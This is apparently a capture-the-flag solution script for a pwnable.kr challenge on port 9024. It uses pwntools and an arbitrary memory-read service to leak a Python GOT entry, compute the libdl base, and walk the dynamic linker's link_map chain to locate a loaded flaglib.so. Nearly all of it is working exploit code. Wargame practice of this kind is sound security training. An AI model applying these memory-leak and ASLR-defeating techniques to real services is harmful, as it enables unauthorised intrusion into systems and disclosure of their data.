from pwn import * 
import binascii


conn = None
verbose = True
HOST = 'pwnable.kr'

def init():
    global conn
    conn = remote(HOST, 9024)
    recv(binary=False)
    recv(binary=False)


def fini():
    global conn
    conn.close()
    conn = None


def bytes_to_int(data):
    barray = bytearray(reversed(data))
    return int(binascii.hexlify(barray), 16)


def recv(binary=False):
    received = conn.recv()
    if verbose:
        if binary:
            print('Server:', received)
        # else:
        #     print('Server:', received.decode())
    return received

def send(data):
    conn.send(data)
    if verbose:
        print('Client:', data.decode())



def query(addr):
    send(hex(addr).encode() + b'\n')
    data = recv(binary=True)
    recv(binary=False)  # Next prompt
    return data


def deref(addr, width=8):
    value_bytes = query(addr)[:width]
    return bytes_to_int(value_bytes)


DLOPEN_AT_PYTHON_GOT = 0x8DE800 
DLOPEN_OFFSET_AT_LIBDL = 0xF70
RTDL_GLOBAL_PTR_OFFSET_AT_LIBDL = 0x202FF0
FLAGLIB_SO_IDX = 13  # The 14th loaded so is flaglib.so 

def get_name_of(dl_idx):
    """ Not in use - used to find FLAGLIB_SO_IDX """
    init()

    dlopen_ptr = DLOPEN_AT_PYTHON_GOT
    dlopen = deref(dlopen_ptr)
    libdl = dlopen - DLOPEN_OFFSET_AT_LIBDL
    _rtdl_global_ptr = libdl + RTDL_GLOBAL_PTR_OFFSET_AT_LIBDL
    _rtdl_global = deref(_rtdl_global_ptr)
    curr_link_map = deref(_rtdl_global)

    for i in range(dl_idx):
        curr_link_map = deref(curr_link_map + 0x18)

    name = query(deref(curr_link_map + 8))

    fini()
    return name


def main():
    print(get_name_of(FLAGLIB_SO_IDX))


if __name__ == '__main__':
    main()
    pass